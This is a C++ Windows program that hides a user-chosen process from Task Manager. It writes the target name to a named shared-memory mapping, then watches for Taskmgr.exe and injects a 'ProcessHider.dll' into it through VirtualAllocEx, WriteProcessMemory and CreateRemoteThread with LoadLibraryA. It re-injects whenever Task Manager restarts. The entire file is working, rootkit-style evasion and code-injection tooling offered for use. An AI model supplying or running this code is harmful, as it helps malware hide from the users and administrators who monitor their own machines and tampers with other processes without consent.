#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <string>

using namespace std;
HANDLE map;
LPVOID buf;

bool inject_dll(DWORD pid, string dll_path) {

	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (handle == INVALID_HANDLE_VALUE) {
		cout << " [-] Open Process Failed" << endl;
		return false;
	}
	else { cout << " [+] Got a Handle to the Remote Process" << endl; }

	LPVOID address = VirtualAllocEx(handle, NULL, dll_path.length() , MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (address == NULL) {
		cout << " [-] VirtualAllocEx Failed" << endl;
		return false;
	}

	bool res = WriteProcessMemory(handle, address, dll_path.c_str(), dll_path.length(), 0);
	if (!res) {
		cout << " [-] WriteProcessMemory Failed" << endl;
	}
	if (CreateRemoteThread(handle, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, (LPVOID)address, NULL, NULL) ==  INVALID_HANDLE_VALUE) {
		cout << " [-] CreateRemoteThread Failed" << endl;
	}
	else { cout << " [+] DLL Loaded Into Remote Process" << endl; }

	cout << " [+] Process Hidden" << endl << endl;
	CloseHandle(handle);
	return true;
}

void find_and_inject()
{
	char* dll_path_c = (char*)malloc(sizeof(char) * 3000);
	GetModuleFileNameA(NULL, dll_path_c, 3000);

	DWORD lastpid = 4;
	string dll_path(dll_path_c);
	size_t index = dll_path.find_last_of('\\');
	dll_path.erase(dll_path.begin() + index, dll_path.end());
	dll_path.append("\\ProcessHider.dll");

	while (true) {		// Keep running to check if TM closes and reopens, if yes then inject again
		PROCESSENTRY32 process;
		process.dwSize = sizeof(PROCESSENTRY32);

		HANDLE proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (proc_snap == INVALID_HANDLE_VALUE) {
			cout << " [-] CreateToolhelp32Snapshot Failed" << endl;
			return;
		}

		if (!Process32First(proc_snap, &process)) {
			cout << " [-] Process32First Failed" << endl;
			return;
		}

		do
		{
			if (!lstrcmp(process.szExeFile, L"Taskmgr.exe") && lastpid != process.th32ProcessID) {
				cout << " [+] Task Manager Detected" << endl;
				if (!inject_dll(process.th32ProcessID, dll_path)) {
					cout << " [-] Unable to Inject DLL!! Check if you are running as Admin" << endl << endl;
					break;
				}
				lastpid = process.th32ProcessID;
			}
		} while (Process32Next(proc_snap, &process));
		CloseHandle(proc_snap);
		Sleep(1000);
	}
}

bool map_process_name(string process) {
	map = CreateFileMappingA(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_READWRITE,
		0,
		255,
		"Global\\GetProcessName"
		);

	if (map == NULL) {
		cout << "CreateFileMapping Failed" << endl;
		return false;
	}

	buf = MapViewOfFile(map,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		255);

	if (buf == NULL) {
		cout << "MapViewOfFile Failed" << endl;
		CloseHandle(map);
		return 0;
	}

	CopyMemory(buf, process.c_str(), process.length());
}

int main()
{
	string process, inp;
	cout << " Enter Process Name To Hide" << endl << "--> ";
    cin >> process;
	cout << endl;
	map_process_name(process);

	CreateThread(
		NULL,
		NULL,
		(LPTHREAD_START_ROUTINE)find_and_inject,
		NULL,
		NULL,
		NULL
	);
	
	cout << "Enter \"quit\" to Quit or Keep this running to inject into future task manager processes" << endl << endl;
	while (true) {
		cin >> inp;
		if (inp == "quit") {
			UnmapViewOfFile(buf);
			CloseHandle(map);
			ExitProcess(0);
		}
	}

	return 0;
}